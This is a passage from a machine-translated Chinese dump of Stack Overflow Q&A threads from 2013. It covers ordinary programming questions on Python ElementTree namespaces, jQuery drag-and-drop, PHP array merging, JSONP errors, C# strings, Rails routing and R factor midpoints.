       printf("%d ",*(ptr));
       i++;
      }
      free(ptr);// Free the memory Locations
     } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:11:03.957

你应该使用：

```
read_file(&testarray); 
```

当您尝试将指针传递给整个数组时。您所做的只是获取数组中第 20 个元素的地址（顺便说一句，它超出了范围）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:12:20.363

表达式`&testarray[20]`是指向数组中最后一个条目*之外*的一个指针（即与 相同`int *`），它与指向数组的指针不同。此外，您现在将参数声明为指针数组，而不是指向数组的指针。`int *arr[]`（和之间的差异`int (*arr)[]`）。

此外，您不需要将指向数组的指针传递给函数，而只需让函数具有普通数组（或指针）参数，并按原样传递数组：

```
void read_file(int myList[]);

int main(void)
{
    int testarray[20];
    read_file(testarray);
    /* .... */
} 
```

在使用数组时，`read_file`您不需要取消引用运算符。`*`您可以将其用作普通数组。*

# ruby-on-rails - rails：我如何整合 expedia api 以在没有数据库的情况下进行示例应用程序？

> ID：14853236
> 
> 赞同：0
> 
> 时间：2013-02-13T12:08:03.403
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我想知道如何在具有零数据库的示例应用程序中整合 expedia api，以便它应该具有改进搜索功能的功能，并使任何人都可以从 Expedia 中提取，以根据链接中输入的关键字提供全面的搜索

- 类似于 www.helloweekends.com 的东西。当您在他们的网站上运行搜索时，下拉列表中的结果分为三个部分。这该怎么做 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:09:26.507

[这](https://stackoverflow.com/questions/2212709/remove-activerecord-in-rails-3)将有助于您问题的第一部分（没有活动记录的 Rails 应用程序）

你可以有一个搜索方法，它使用像[HTTParty](http://rubygems.org/gems/httparty)这样的 http 库来获取用户的输入，对其他服务进行相同的调用，获取结果，并在你认为合适的时候将它们聚合到你的搜索方法中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-14T10:29:57.940

有一个 gem [expedia](https://github.com/zaidakram/expedia)可以帮助你很多

# java - 使用JSoup选择一组标签

> ID：14853238
> 
> 赞同：1
> 
> 时间：2013-02-13T12:08:10.460
> 
> 标签：java, jsoup

我正在尝试使用 JSoup 从页面上抓取一些信息，这些信息可以通过一组特定顺序的标签来识别。它们的顺序如下：

```
 <span class="sold" >Sold</span></td>
    <td class='prc'>
        <div  class="g-b bidsold" itemprop="price">
                AU $1.00</div> 
```

我正在寻找代替页面上 AU $1.00 字段的每个值，但它们只能由`span class="sold"`预先出现几个标签的选择器识别。

我尝试过类似的东西，`select("span.sold:lt(4) + [itemprop=price]")`但感觉就像我在黑暗中四处乱窜！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:45:19.533

下面的代码应该可以解决问题！！！

```
Document doc = Jsoup.connect(/*URL of your HTML document*/").get();
Element part = doc.body();
Elements parts = part.getElementsByTag("div");
String attValue;
String requiredContent;
for(Element ent : parts)
{
    if(ent.hasAttr("class"))
    {
        attValue = ent.attr("class");
        if(attValue.equals("g-b bidsold"))
        {
            System.out.println("\n");
            requiredContent=ent.text();
            System.out.println(requiredContent);
        }
    }
} 
```

只需确保迭代并在数组中获取输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-19T07:40:29.020

你也可以这样做：

`Elements soldPrices = doc.select("td:has(.sold) + td [itemprop=price]");`

这将返回具有价格 itemprops 的元素（DIV），这些元素立即具有前面带有 class=sold 的元素（SPAN）的 TD。

有关更多详细信息，请参阅[选择器语法](http://jsoup.org/apidocs/org/jsoup/select/Selector.html)。

# android - 在Android中为两个视图翻转动画

> ID：14853242
> 
> 赞同：0
> 
> 时间：2013-02-13T12:08:31.580
> 
> 标签：android

**谁能告诉我怎么做**

我是android的新手。我想为以下创建动画：

我有两个视图：1.由画布绘制的图像（假设 DrawView）和 2.TextView

我向 DrawView 添加了从 -90 到 90 的旋转（就像它以圆周运动从左下角到右下角擦拭屏幕一样）

现在我想显示 TextView 就像 DrawView 图像正在揭示 Textview 一样。

我认为 Drawview 应该像 foreground view 和 textView 像 background 一样。

我正在添加图像以获得更好的解释！

图片链接： [https ://docs.google.com/file/d/0B8DGjJBt0XQ_TVBtS0lidUFhZzA/edit?usp=sharing](https://docs.google.com/file/d/0B8DGjJBt0XQ_TVBtS0lidUFhZzA/edit?usp=sharing)

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T08:44:41.250

我在框架布局中使用了两个视图。

将画布绘制的图像（假设为 DrawView）作为前视图。使用 DrawView.bringToFront();

工作！

# python - 通过“ElementTree”在 Python 中使用命名空间解析 XML

> ID：14853243
> 
> 赞同：179
> 
> 时间：2013-02-13T12:08:37.553
> 
> 标签：python, xml, xml-parsing, xml-namespaces, elementtree

我有以下要使用 Python 解析的 XML `ElementTree`：

```
<rdf:RDF xml:base="http://dbpedia.org/ontology/"
    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:owl="http://www.w3.org/2002/07/owl#"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema#"
    xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
    xmlns="http://dbpedia.org/ontology/">

    <owl:Class rdf:about="http://dbpedia.org/ontology/BasketballLeague">
        <rdfs:label xml:lang="en">basketball league</rdfs:label>
        <rdfs:comment xml:lang="en">
          a group of sports teams that compete against each other
          in Basketball
        </rdfs:comment>
    </owl:Class>

</rdf:RDF> 
```

我想找到所有`owl:Class`标签，然后提取其中所有`rdfs:label`实例的值。我正在使用以下代码：

```
tree = ET.parse("filename")
root = tree.getroot()
root.findall('owl:Class') 
```

由于命名空间，我收到以下错误。

```
SyntaxError: prefix 'owl' not found in prefix map 
```

我尝试阅读[http://effbot.org/zone/element-namespaces.htm](http://effbot.org/zone/element-namespaces.htm)上的文档，但由于上述 XML 有多个嵌套命名空间，我仍然无法正常工作。

请让我知道如何更改代码以查找所有`owl:Class`标签。

* * *

## 回答 #1

> 赞同：241
> 
> 时间：2013-02-13T12:18:22.470

你需要给`.find()`,`findall()`和`iterfind()`方法一个明确的命名空间字典：

```
namespaces = {'owl': 'http://www.w3.org/2002/07/owl#'} # add more as needed

root.findall('owl:Class', namespaces) 
```

前缀*只会*在您传入的参数中查找`namespaces`。这意味着您可以使用任何您喜欢的命名空间前缀；API 将部分拆分出来`owl:`，在字典中查找相应的命名空间 URL `namespaces`，然后将搜索更改为查找 XPath 表达式`{http://www.w3.org/2002/07/owl}Class`。当然，您也可以自己使用相同的语法：

```
root.findall('{http://www.w3.org/2002/07/owl#}Class') 
```

另请参阅 ElementTree 文档的[*Parsing XML with Namespaces*部分](https://docs.python.org/3/library/xml.etree.elementtree.html#parsing-xml-with-namespaces)。

如果您可以切换到[`lxml`图书馆](http://lxml.de/)，那就更好了；`.nsmap`该库支持相同的 ElementTree API，但在元素的属性中为您收集命名空间，并且通常具有出色的命名空间支持。

* * *

## 回答 #2

> 赞同：62
> 
> 时间：2014-11-07T18:22:52.877

这是使用 lxml 执行此操作的方法，而无需对名称空间进行硬编码或扫描它们的文本（正如 Martijn Pieters 所提到的）：

```
from lxml import etree
tree = etree.parse("filename")
root = tree.getroot()
root.findall('owl:Class', root.nsmap) 
```

**更新**：

5年后，我仍然遇到这个问题的变化。正如我在上面展示的那样，lxml 有帮助，但并非在所有情况下都如此。在合并文档时，评论者可能对这种技术有一个有效的观点，但我认为大多数人在简单地搜索文档时遇到困难。

这是另一个案例以及我如何处理它：

```
<?xml version="1.0" ?><Tag1 xmlns="http://www.mynamespace.com/prefix">
<Tag2>content</Tag2></Tag1> 
```

没有前缀的 xmlns 意味着不带前缀的标签会获得这个默认的命名空间。这意味着当您搜索 Tag2 时，您需要包含命名空间才能找到它。但是，lxml 创建了一个以 None 为键的 nsmap 条目，我找不到搜索它的方法。所以，我像这样创建了一个新的命名空间字典

```
namespaces = {}
# response uses a default namespace, and tags don't mention it
# create a new ns map using an identifier of our choice
for k,v in root.nsmap.iteritems():
    if not k:
        namespaces['myprefix'] = v
e = root.find('myprefix:Tag2', namespaces) 
```

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2016-05-24T09:09:56.317

***注意****：这是一个对 Python 的 ElementTree 标准库有用的答案，无需使用硬编码的命名空间。*

要从 XML 数据中提取命名空间的前缀和 URI，您可以使用`ElementTree.iterparse`函数，仅解析命名空间启动事件 ( *start-ns* )：

```
>>> from io import StringIO
>>> from xml.etree import ElementTree
>>> my_schema = u'''<rdf:RDF xml:base="http://dbpedia.org/ontology/"
...     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
...     xmlns:owl="http://www.w3.org/2002/07/owl#"
...     xmlns:xsd="http://www.w3.org/2001/XMLSchema#"
...     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
...     xmlns="http://dbpedia.org/ontology/">
... 
...     <owl:Class rdf:about="http://dbpedia.org/ontology/BasketballLeague">
...         <rdfs:label xml:lang="en">basketball league</rdfs:label>
...         <rdfs:comment xml:lang="en">
...           a group of sports teams that compete against each other
...           in Basketball
...         </rdfs:comment>
...     </owl:Class>
... 
... </rdf:RDF>'''
>>> my_namespaces = dict([
...     node for _, node in ElementTree.iterparse(
...         StringIO(my_schema), events=['start-ns']
...     )
... ])
>>> from pprint import pprint
>>> pprint(my_namespaces)
{'': 'http://dbpedia.org/ontology/',
 'owl': 'http://www.w3.org/2002/07/owl#',
 'rdf': 'http://www.w3.org/1999/02/22-rdf-syntax-ns#',
 'rdfs': 'http://www.w3.org/2000/01/rdf-schema#',
 'xsd': 'http://www.w3.org/2001/XMLSchema#'} 
```

然后字典可以作为参数传递给搜索函数：

```
root.findall('owl:Class', my_namespaces) 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2016-08-16T09:51:36.693

我一直在使用与此类似的代码，并发现它总是值得阅读文档......像往常一样！

findall() 只会找到**当前标签的直接子**元素。所以，并不是所有的。

尝试让您的代码使用以下内容可能是值得的，特别是如果您正在处理大而复杂的 xml 文件，以便还包括子子元素（等）。如果您知道自己的元素在 xml 中的位置，那么我想它会没事的！只是觉得这值得记住。

```
root.iter() 
```

参考：[https://docs.python.org/3/library/xml.etree.elementtree.html#finding-interesting-elements](https://docs.python.org/3/library/xml.etree.elementtree.html#finding-interesting-elements) “Element.findall() 仅查找带有标签的元素，这些标签是当前元素的直接子元素。 Element.find() 找到具有特定标签的第一个子元素，Element.text 访问元素的文本内容。Element.get() 访问元素的属性："

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2018-10-01T12:25:59.707

要获取命名空间格式的命名空间，例如`{myNameSpace}`，您可以执行以下操作：

```
root = tree.getroot()
ns = re.match(r'{.*}', root.tag).group(0) 
```

这样，您可以稍后在代码中使用它来查找节点，例如使用字符串插值（Python 3）。

```
link = root.find(f"{ns}link") 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-05-30T11:00:02.053

我的解决方案基于@Martijn Pieters 的评论：

> `register_namespace`只影响序列化，不影响搜索。

所以这里的诀窍是使用不同的字典进行序列化和搜索。

```
namespaces = {
    '': 'http://www.example.com/default-schema',
    'spec': 'http://www.example.com/specialized-schema',
} 
```

现在，注册所有用于解析和写入的命名空间：

```
for name, value in namespaces.iteritems():
    ET.register_namespace(name, value) 
```

对于搜索 ( `find()`, `findall()`, `iterfind()`)，我们需要一个非空前缀。将修改后的字典传递给这些函数（这里我修改了原始字典，但这必须在命名空间注册后才能进行）。

```
self.namespaces['default'] = self.namespaces[''] 
```

现在，该`find()`系列的函数可以与`default`前缀一起使用：

```
print root.find('default:myelem', namespaces) 
```

但

```
tree.write(destination) 
```

不对默认命名空间中的元素使用任何前缀。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-04-07T16:13:53.000

这基本上是 Davide Brunato 的回答，但是我发现他的回答存在严重问题，默认命名空间是空字符串，至少在我的 python 3.6 安装中是这样。我从他的代码中提取并为我工作的功能如下：

```
from io import StringIO
from xml.etree import ElementTree
def get_namespaces(xml_string):
    namespaces = dict([
            node for _, node in ElementTree.iterparse(
                StringIO(xml_string), events=['start-ns']
            )
    ])
    namespaces["ns0"] = namespaces[""]
    return namespaces 
```

where`ns0`只是空命名空间的占位符，您可以将其替换为您喜欢的任何随机字符串。

如果我这样做：

```
my_namespaces = get_namespaces(my_schema)
root.findall('ns0:SomeTagWithDefaultNamespace', my_namespaces) 
```

它还为使用默认命名空间的标签生成正确答案。

# javascript - jquery Drag and Drop - 可放置区域有边框，可拖动项目不会捕捉到该边框的内部

> ID：14853249
> 
> 赞同：0
> 
> 时间：2013-02-13T12:09:03.653
> 
> 标签：javascript, jquery, draggable, droppable

我正在使用 jQuery 拖放来创建一个磁贴列表以及一个可以拖放到任何磁贴中的可拖动小部件。

每个图块都有一个边框，但小部件没有，因此尽管它们的大小相同，但当我将小部件放入图块时，它会捕捉到图块边框的左下角。因此，在图块的顶部有两个备用像素。

这是一个小提琴 [http://jsfiddle.net/gztQM/](http://jsfiddle.net/gztQM/)

和一些代码：

```
div[id^="row"] {float:left; width:65px; height:65px; margin:5px;border:1px solid #454545; background-color:#262e41;}
.bookmark {float:left; width:65px; height:65px; background-color:#edff57;cursor: move;display:block; margin:-1px 0px 0px -1px;}
.bookmark.ui-draggable-dragging {-moz-box-shadow: 0 0 5px #d9d9d9; -webkit-box-shadow: 0 0 5px #d9d9d9; box-shadow: 0 0 5px #d9d9d9;} 
```

这是可放置区域（图块）的示例

```
<div class="position" id="row-2col-1"></div> 
```

可拖动的链接

```
<a href class="bookmark"></a> 
```

JS

```
$('.bookmark').draggable({containment: '#content', snap:'.position', snapMode:'inner', revert:'invalid',snapTolerance: 32});

$('.position').droppable({drop: handleDropEvent, accept:'.bookmark'});
function handleDropEvent( event, ui ) {
  var draggable = ui.draggable;
} 
```

我怎样才能让它捕捉到边界内？我尝试添加边距和填充，但无济于事。在 jquery 网站上也看不到任何提及此内容的内容

帮助！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:27:31.067

**更新：**

看起来`draggable`对象总是捕捉到`droppable`容器的边缘，覆盖边界。`box-sizing`正如我之前提到的，这似乎没有受到影响。这种行为甚至可以在[jQuery UI 示例](http://jqueryui.com/draggable/#snap-to)中看到。

您最好的选择是完全删除边框，修改 jQuery UI 方法的行为以按照您想要的方式运行，或者将每个`droppable`容器包装在`div`提供边距和边框样式的容器中（并从`droppable`容器本身中删除它们） .

[jsfiddle（包装示例）](http://jsfiddle.net/X5gnN/)

**原答案：**

我相信这可能与`snapMode:'inner'`由于框模型而实际影响框的内部对齐（）的边框有关。

您可以通过在盒子上没有边框或使用[`box-sizing: border-box`](https://developer.mozilla.org/en-US/docs/CSS/box-sizing)它将改变盒子模型的行为方式来解决这个问题。请记住，IE8 之前的 IE 版本不支持在没有 polyfill 的情况下使用 box-sizing。

```
div[id^="row"] {
    float:left;
    width:65px;
    height:65px;
    margin:5px;
    border:1px solid #454545;
    background-color:#262e41;
    /* support Firefox, WebKit, Opera and IE8+ */
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
} 
```

[jsfiddle](http://jsfiddle.net/QTwqt/1/)

# c# - 不能将超链接写成字符串

> ID：14853254
> 
> 赞同：1
> 
> 时间：2013-02-13T12:09:09.800
> 
> 标签：c#, winforms, url, hyperlink, backslash

我想写这样的东西

```
string input = "<form action=\"http://blabla.com\" method=\"post\">...</form>"; 
```

但是.com结束的反斜杠（）与链接合并......我能做什么？

所以链接变成[了 http://blabla.com](http://blabla.com) \

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:15:37.163

对于同时包含斜杠和双引号的字符串，这可能更具可读性。这是给我的。

```
string input = @"<form action=""http://blabla.com"" method=""post"">...</form>"; 
```

另请注意，单引号在 HTML 中是可以接受的，所以这也应该有效：

```
string input = @"<form action='http://blabla.com' method='post'>...</form>"; 
```

这是有关 C# 中文字的一些附加信息

[http://msdn.microsoft.com/en-us/library/aa691090(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa691090(v=vs.71).aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:18:31.020

这仅在 Visual Studio 编辑器中可见。运行时，您的程序应该可以正常工作。

# ruby-on-rails - 如何向资源添加“预览”操作？

> ID：14853256
> 
> 赞同：0
> 
> 时间：2013-02-13T12:09:15.457
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rest, routes

我正在寻找正确的方法来包含和`preview`动作之间`new`的`create`动作。假设我有以下内容：

```
resources :users 
```

默认情况下，提交表单时：

*   如果`new`，调用`create`动作；
*   如果`edit`，请`update`采取行动。

这样一来，我就可以对 and 使用相同的形式（部分）了`new`，`create`太棒了！

如何配置资源以包含`preview`操作之间的操作。我的意思是，强迫`new`打电话`preview`，然后`preview`打电话`create`。

我可以添加一个新的路线/动作并指向该动作的表单，但是相同的表单不能用于`new`and `edit`。

有没有办法配置资源来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:04:23.660

看看这个 railscast: [multibutton form](http://railscasts.com/episodes/38-multibutton-form)，它显示了一个带有“预览”和“提交”按钮的表单，也许这是你可能想要做的事情。

顺便说一句，您不能通过将局部变量传递给局部变量来使用相同的形式吗？例如：

```
<%= form_for @profile, url: dynamic_path do |f| %>
  ...
<% end %>

<%= render 'form', dynamic_path: profile_preview_path %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T15:56:07.020

你有几种方法可以做到这一点：

1.  您将表单的 url 更改为您的`preview`操作（您必须为其添加路线）。
2.  您使用您的创建操作进行预览和创建：
    即您向表单提交请求添加一个参数（如“：go_to_preview”）。如果你在你渲染的控制器中找到它`preview`。
    当用户想要确认预览时，您再次提交数据（不带该参数），这次创建记录。

还有另外两种动态可能性：

1.  您实时创建预览 - 如果可能的话（就像这里一样） - 并且只使用`create`动作，
2.  *第一个选项的变体*：当用户提交表单时，您向操作发送*ajax 发布请求*`preview`，呈现部分并将其包含在页面上，然后当您的用户仍然拥有他刚刚填写的表单时，用户决定是否她肯定想修改或提交。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-02-13T12:59:49.800

我建议添加一个 DateTime 列“finished_at”、“published_on”等......任何适合您的域的内容。

以博客文章为例：

```
scope :published, where("published_on IS NOT NULL")
scope :draft, where(:published_on => nil) 
```

在适当的地方使用范围和新字段来限制后续操作。

这种方法给你的比你要求的多：

1.  一种基于“状态”来限制处理的方法
2.  创建时间与发布时间的数据

# c# - 如何从末尾获取字符串的一部分

> ID：14853259
> 
> 赞同：0
> 
> 时间：2013-02-13T12:09:19.553
> 
> 标签：c#, substring

给定这个字符串：

`01/01/2000 Club Lets Rock Jonny`

如您所见，我有 3 个信息除以空格，第二个`Club Lets Rock`信息是 2 个空格的一个信息。Jony 是向我发送此信息的人的姓名，我需要知道，我如何才能获得此人的姓名？有没有办法从字符串的末尾获取它，直到它到达第一个空格？

我知道还有很多其他线程，`substring`但没有一个是这样的。我还阅读了一些网站上的文章，这些文章解释了`substring`但找不到适合我的情况。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T12:09:52.000

使用空格字符作为分隔符拆分字符串并获取最后一项。

就像是：

```
string name = "01/01/2000 Club Lets Rock Jonny".Split(' ').Last(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:13:42.810

怎么样

```
var yourString = "01/01/2000 Club Lets Rock Jonny";
var everythingAfterTheLastSpace = 
    yourString.SubString(yourString.LastIndexOf(' ') + 1); 
```

# php - 合并具有相同键的两个数组

> ID：14853261
> 
> 赞同：0
> 
> 时间：2013-02-13T12:09:27.547
> 
> 标签：php, arrays

我需要合并两个数组的帮助。假设我有以下数组：

```
Array
(
[3] => Array
    (
        [id] => 3
        [name] => Lorem
        [type] => pl
    )

[2] => Array
    (
        [id] => 2
        [name] => Ipsum
        [type] => pl
    )

) 
```

第二个：

```
Array
(
    [6] => Sit dolor
    [4] => nostrud exercitation ullamco
    [3] => uuntur magni dolores
    [2] => corporis suscipit laboriosam
    [7] =>  quia non numquam eius modi tempora
 ) 
```

所需的输出是：

```
Array
(
[3] => Array
    (
        [id] => 3
        [name] => Lorem
        [type] => pl
        [new_key] => uuntur magni dolores
    )

[2] => Array
    (
        [id] => 2
        [name] => Ipsum
        [type] => pl
        [new_key] => corporis suscipit laboriosam
    )
) 
```

我一直在尝试将数组与`array_diff_key()`方法进行比较，而不是在某个循环中合并数组，但我无法让它工作。是否有任何内置的 PHP 函数，或者我应该自己编写？如果是这样，你能帮我得到想要的结果吗？任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T12:18:14.727

所有你需要的是

```
$data = array_map(function ($v) use($new) {
    isset($new[$v['id']]) and $v['new_key'] = $new[$v['id']] ;
    return $v;
}, $data);

var_dump($data); 
```

输出（[演示](http://eval.in/9745)）

```
array (size=2)
  3 => 
    array (size=4)
      'id' => int 3
      'name' => string 'Lorem' (length=5)
      'type' => string 'pl' (length=2)
      'new_key' => string 'uuntur magni dolores' (length=20)
  2 => 
    array (size=4)
      'id' => int 2
      'name' => string 'Ipsum' (length=5)
      'type' => string 'pl' (length=2)
      'new_key' => string 'corporis suscipit laboriosam' (length=28) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:14:43.517

您可以简单地遍历第一个数组：

```
foreach ($arr1 as $key=> $item) {
    $arr1[$key]['new_key'] = isset($arr2[$item['id']]) ? $arr2[$item['id']] : '';
} 
```

或者

```
foreach ($arr1 as &$item) { //just for fun
    $item['new_key'] = isset($arr2[$item['id']]) ? $arr2[$item['id']] : '';
} 
```

但似乎您的数据来自数据库。如果我是对的，你最好使用 sql [`JOIN`](http://en.wikipedia.org/wiki/Join_%28SQL%29)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:21:04.207

```
<?php
$first_array  = Array("3" => Array("id" => 3,"name" => "Lorem","type" => "pl"),
                      "2" => Array("id" => 2,"name" => "Ipsum","type" => "pl")
                     );

$sec_array   = Array("6" => "Sit dolor",
                    "4" => "nostrud exercitation ullamco",
                    "3" => "uuntur magni dolores",
                    "2" => "corporis suscipit laboriosam",
                    "7" =>  "quia non numquam eius modi tempora",
                 );

$res_array   = array();
foreach($first_array as $key=>$val){
     if(array_key_exists($key,$sec_array)){
        $val["new_key"] = $sec_array[$key];
     }
     $res_array[$key]   = $val;
}

echo "<pre>";
print_r($res_array);
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:18:01.790

你也可以像这样简单地做

```
foreach($arr1 as $key => $arr) {

        $arr1[$key]['new_key'] = isset($arr2[$key])?$arr2[$key]:'';
} 
```

# javascript - jQuery AJAX JSONP 错误“意外令牌”

> ID：14853267
> 
> 赞同：4
> 
> 时间：2013-02-13T12:09:38.750
> 
> 标签：javascript, jquery, ajax, xmlhttprequest, jsonp

我正在尝试在 Chrome 中进行跨域**JSONP**调用，但我不断返回**“未捕获的语法错误：意外的令牌：”** 我尝试过：更改响应内容类型、设置 xhr 标头、JSON.stringify，几乎是大多数这里提供的解决方案，但到目前为止没有任何效果:-(

```
 $.ajax({
                type: "POST",
                url: "https://www.virustotal.com/vtapi/v2/url/report",
                crossDomain: true,
                contentType: "application/json; charset=UTF-8",
                dataType: 'jsonp',
                data: {
                    apikey: "*",
                    resource: "http://www.1001freefonts.com/font/BaroqueScript.zip"
                },
                jsonp: false,
                jsonpCallback: receive,
                success: function (data, textStatus, jqXHR) {
                    console.log("Data retrieved: " + data);
                }
            }).done(function () {
                console.log('I think we are done here');
            })
        .error(function (e) {
            console.log(arguments);
            console.log('something went funny here');
        })
        .complete(function (xhr, status) {

            console.log("complete");
        if (status === 'error' || !xhr.responseText) {
            console.log('error');
        }
        else {
            console.log("data found:" + xhr.responseText);
            //...
        }
    });
    });

    function receive(saveData) {
        if (saveData == null) {
            console.log("DATA IS UNDEFINED!");  // displays every time
        }
        console.log("Success is " + saveData);  // 'Success is undefined'
    } 
```

在调试器中我可以看到响应

```
{"permalink": "https://www.virustotal.com/url/b5b546fdbb49a2258e951c5e568a52655c65ac56112e39d15af0954a53b36772/analysis/1360339512/", "url": "http://www.1001freefonts.com/font/BaroqueScript.zip", "response_code": 1, "scan_date": "2013-02-08 16:05:12", "scan_id": "b5b546fdbb49a2258e951c5e568a52655c65ac56112e39d15af0954a53b36772-1360339512", "verbose_msg": "Scan finished, scan information embedded in this object", "filescan_id": "b7e13c0242e9690aba1f3da4b73d9c2e99a9b7fd03f542b55e694a34aaf9eca8-1360339519", "positives": 0, "total": 35, "scans": {"CLEAN MX": {"detected": false, "result": "clean site"}, "MalwarePatrol": {"detected": false, "result": "clean site"}, "ZDB Zeus": {"detected": false, "result": "clean site"}, "K7AntiVirus": {"detected": false, "result": "clean site"}, "Quttera": {"detected": false, "result": "clean site"}, "Yandex Safebrowsing": {"detected": false, "result": "clean site"}, "MalwareDomainList": {"detected": false, "result": "clean site"}, "ZeusTracker": {"detected": false, "result": "clean site"}, "zvelo": {"detected": false, "result": "clean site"}, "Google Safebrowsing": {"detected": false, "result": "clean site"}, "BitDefender": {"detected": false, "result": "clean site"}, "Opera": {"detected": false, "result": "clean site"}, "G-Data": {"detected": false, "result": "clean site"}, "C-SIRT": {"detected": false, "result": "clean site"}, "Sucuri SiteCheck": {"detected": false, "result": "clean site"}, "VX Vault": {"detected": false, "result": "clean site"}, "ADMINUSLabs": {"detected": false, "result": "clean site"}, "SCUMWARE.org": {"detected": false, "result": "clean site"}, "Dr.Web": {"detected": false, "result": "clean site"}, "AlienVault": {"detected": false, "result": "clean site"}, "Malc0de Database": {"detected": false, "result": "clean site"}, "SpyEyeTracker": {"detected": false, "result": "clean site"}, "Phishtank": {"detected": false, "result": "clean site"}, "Avira": {"detected": false, "result": "clean site"}, "Antiy-AVL": {"detected": false, "result": "clean site"}, "Comodo Site Inspector": {"detected": false, "result": "clean site"}, "Malekal": {"detected": false, "result": "clean site"}, "ESET": {"detected": false, "result": "clean site"}, "SecureBrain": {"detected": false, "result": "unrated site"}, "Netcraft": {"detected": false, "result": "clean site"}, "ParetoLogic": {"detected": false, "result": "clean site"}, "URLQuery": {"detected": false, "result": "unrated site"}, "Wepawet": {"detected": false, "result": "unrated site"}, "Minotaur": {"detected": false, "result": "clean site"}}} 
```

我已经在[http://jsonlint.com/](http://jsonlint.com/)上验证了它，它表明它是一个有效的 JSON。

这是响应标头

```
cache-control:no-cache
content-encoding:gzip
content-length:695
content-type:application/json
date:Wed, 13 Feb 2013 12:00:33 GMT
server:Google Frontend
status:200 OK
vary:Accept-Encoding
version:HTTP/1.1 
```

有人有任何想法/建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T13:27:08.427

经过彻底的测试，很明显，当 ajax 期望返回 JSONP 时（由于跨域限制），无法捕获 JSON 对象结果。即使响应状态 = 200。

我一直在使用 jQuery AJAX 调用进行测试，试图查看是否仍然可以捕获结果——尽管浏览器抛出了解析错误——但这似乎不可能。看起来响应文本在 JS 工作完成后到达标头。

正如@Florian F. @Likwid_T @Christoph 上面所建议的那样，肯定需要服务器端脚本才能使其正常工作。其他开发人员似乎热衷于使用用 C# 编写的代理作为解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:17:36.030

Christoph 是对的，您需要将答案包含在回调函数中，在您的情况下位于 PHP 文件的末尾：

```
echo $_GET['receive'] . '(' . json_encode($yourResultObject) . ');'; 
```

或者如果您需要更复杂的对象

```
echo $_GET['receive'] . '(' . json_encode(array(name1 => object1, name2 => object2, name3 => object3)) . ');'; 
```

你可能需要稍微调整一下，但基本上每当我得到**Unexpected token**时，几乎总是一个语法错误，导致 jQuery 无法获取我的回调函数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T13:01:46.253

JSONP 不能开箱即用。

JSONP 通过将结果加载到脚本标签中来绕过跨域限制。

基本上，您的服务器必须启用 JSONP。

在发送响应之前，在服务器端做任何需要做的事情：

1.  检查请求是否设置了“_callback”
2.  如果设置，则使用 _callback 的值包装您的内容。
3.  发送您的数据

PHP 中的代码示例：

```
$responseString = '{"smthing":"val","smthingelse":"val2"}';
if (isset($_REQUEST['_callback'])) {
    $responseString = $_REQUEST['_callback'] . '(' . $responseString . ');';
} 
```

它将使用正确的参数执行您的“完成”匿名函数。（JQuery 处理一切）

# r - 将切割因子变量映射到R中的数字

> ID：14853268
> 
> 赞同：0
> 
> 时间：2013-02-13T12:09:49.560
> 
> 标签：r

我有一个由直方图箱表示的因子变量，其值为： '660-664' , ... , '740-744' , 745-749' ..

如何将因子变量映射到其平均值，例如将“660-664”映射到 662？

基本上，我正在寻找的是“cut”函数的倒数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:23:13.660

您可以使用`plot = FALSE`参数 from`hist`来提取中断，然后使用它来获取中点：

```
set.seed(1)
x <- sample(300, 30)
x
#  [1]  80 112 171 270  60 266 278 194 184  18 296  52 198 111 221 142
# [17] 204 281 108 219 262 290 182  35  74 107   4 105 237  93
temp <- hist(x, plot = FALSE)$breaks
temp
# [1]   0  50 100 150 200 250 300
rowMeans(cbind(head(temp, -1),
               tail(temp, -1)))
# [1]  25  75 125 175 225 275 
```

* * *

### 更新：从范围的字符串计算平均值

从您的评论来看，您可能正在寻找更像这样的东西：

```
myVec <- c("735-739", "715-719", "690-694", "695-699", "695-699",
           "670-674", "720-724", "705-709", "685-689")
myVec
# [1] "735-739" "715-719" "690-694" "695-699" "695-699" "670-674"
# [7] "720-724" "705-709" "685-689"
sapply(strsplit(myVec, "-"), function(x) mean(as.numeric(x)))
